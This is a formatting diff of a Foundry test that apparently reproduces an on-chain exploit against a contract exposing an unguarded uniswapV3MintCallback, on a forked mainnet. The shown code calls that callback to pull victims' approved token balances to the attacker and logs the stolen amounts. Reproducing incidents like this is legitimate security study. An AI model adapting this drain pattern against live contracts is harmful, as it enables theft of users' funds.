@@ -15,11 +15,7 @@ import "./interface.sol";
 // https://twitter.com/BeosinAlert/status/1677548773269213184
 
 interface ICiv {
-    function uniswapV3MintCallback(
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external;
+    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external;
 }
 
 contract ContractTest is Test {
@@ -106,7 +102,7 @@ contract ContractTest is Test {
     uint256 private counter = 0;
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17646141);
+        cheats.createSelectFork("mainnet", 17_646_141);
         cheats.label(address(USDT), "USDT");
         cheats.label(address(BONE), "BONE");
         cheats.label(address(LEASH), "LEASH");
@@ -124,56 +120,36 @@ contract ContractTest is Test {
         }
 
         emit log_named_decimal_uint(
-            "Attacker USDT balance after exploit",
-            USDT.balanceOf(address(this)),
-            USDT.decimals()
-        );
+            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
+            );
         emit log_named_decimal_uint(
-            "Attacker BONE balance after exploit",
-            BONE.balanceOf(address(this)),
-            BONE.decimals()
-        );
+            "Attacker BONE balance after exploit", BONE.balanceOf(address(this)), BONE.decimals()
+            );
         emit log_named_decimal_uint(
-            "Attacker WOOF balance after exploit",
-            WOOF.balanceOf(address(this)),
-            WOOF.decimals()
-        );
+            "Attacker WOOF balance after exploit", WOOF.balanceOf(address(this)), WOOF.decimals()
+            );
 
         emit log_named_decimal_uint(
-            "Attacker LEASH balance after exploit",
-            LEASH.balanceOf(address(this)),
-            LEASH.decimals()
-        );
+            "Attacker LEASH balance after exploit", LEASH.balanceOf(address(this)), LEASH.decimals()
+            );
 
         emit log_named_decimal_uint(
-            "Attacker SANI balance after exploit",
-            SANI.balanceOf(address(this)),
-            SANI.decimals()
-        );
+            "Attacker SANI balance after exploit", SANI.balanceOf(address(this)), SANI.decimals()
+            );
+
+        emit log_named_decimal_uint("Attacker ONE balance after exploit", ONE.balanceOf(address(this)), ONE.decimals());
 
         emit log_named_decimal_uint(
-            "Attacker ONE balance after exploit",
-            ONE.balanceOf(address(this)),
-            ONE.decimals()
-        );
+            "Attacker CELL balance after exploit", CELL.balanceOf(address(this)), CELL.decimals()
+            );
 
         emit log_named_decimal_uint(
-            "Attacker CELL balance after exploit",
-            CELL.balanceOf(address(this)),
-            CELL.decimals()
-        );
+            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
+            );
 
         emit log_named_decimal_uint(
-            "Attacker USDC balance after exploit",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
-        );
-
-        emit log_named_decimal_uint(
-            "Attacker SHIB balance after exploit",
-            SHIB.balanceOf(address(this)),
-            SHIB.decimals()
-        );
+            "Attacker SHIB balance after exploit", SHIB.balanceOf(address(this)), SHIB.decimals()
+            );
     }
 
     // Step 2. This function will be called from vulnerable contract (after step 1).
@@ -258,25 +234,14 @@ contract ContractTest is Test {
 
     function callVulnerableContract() internal {
         (bool success, bytes memory retData) = address(VulnerableContract).call(
-            abi.encodeWithSelector(
-                bytes4(0x5ffe72b7),
-                0,
-                0,
-                0,
-                address(this),
-                0,
-                0,
-                0
-            )
+            abi.encodeWithSelector(bytes4(0x5ffe72b7), 0, 0, 0, address(this), 0, 0, 0)
         );
         require(success);
     }
 
     function uniswapV3MintCallback(uint256 num) internal {
         VulnerableContract.uniswapV3MintCallback(
-            0,
-            victimsAssets[num].balanceOf(victims[num]),
-            abi.encode(victims[num])
+            0, victimsAssets[num].balanceOf(victims[num]), abi.encode(victims[num])
         );
     }
 }
